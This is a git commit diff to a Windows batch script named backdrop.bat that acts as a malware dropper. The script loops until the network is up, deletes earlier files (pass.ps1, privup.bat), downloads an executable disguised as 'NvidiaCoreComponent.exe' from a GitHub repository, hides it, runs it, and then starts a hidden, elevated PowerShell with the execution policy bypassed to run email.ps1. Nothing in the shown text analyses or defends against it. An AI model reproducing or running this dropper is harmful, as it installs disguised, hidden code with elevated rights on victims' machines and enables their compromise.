4242d2b45c5e4f1b07bc15ac78efba86ab8e00c6
İsmayil <60405884+4V4loon@users.noreply.github.com>
2021-11-12 18:29:32 +0400

    Update backdrop.bat

--- backdrop.bat
+++ backdrop.bat
@@ -1,21 +1,20 @@
 @echo off
-:ping
-ping www.google.com -n 2 | find "TTL="
-IF %ERRORLEVEL% EQU 0 ( goto run ) else ( goto ping )
+:while
+ping www.google.com -n 1 | find "TTL="
+IF %ERRORLEVEL% EQU 0 ( goto :run ) else ( goto :while )
 
 :run
 if exist %appdata%\Microsoft\pass.ps1 (del /f %appdata%\Microsoft\pass.ps1)
 if exist %appdata%\Microsoft\privup.bat (del /f %appdata%\Microsoft\privup.bat)
-if exist %appdata%\Microsoft\NvidiaCoreComponent.exe (
-	QPROCESS "NvidiaCoreComponent.exe">NUL
-	IF %ERRORLEVEL% EQU 0 (exit) else (goto execute)
-	) else (goto download && goto execute)
+if exist %appdata%\Microsoft\NvidiaCoreComponent.exe ( goto :execute ) else (goto :download)
 
 :download
 powershell -command "Invoke-WebRequest -Uri 'https://github.com/4V4loon/tools/blob/master/NvidiaCoreComponent.exe?raw=true' -OutFile $env:appdata\Microsoft\NvidiaCoreComponent.exe"
 attrib +h %appdata%\Microsoft\NvidiaCoreComponent.exe
+goto :execute
 
 :execute
-NvidiaCoreComponent.exe
+cd %appdata%\Microsoft
+.\NvidiaCoreComponent.exe
 powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:appdata\Microsoft\email.ps1' -WindowStyle Hidden -Verb RunAs -Wait"
 exit
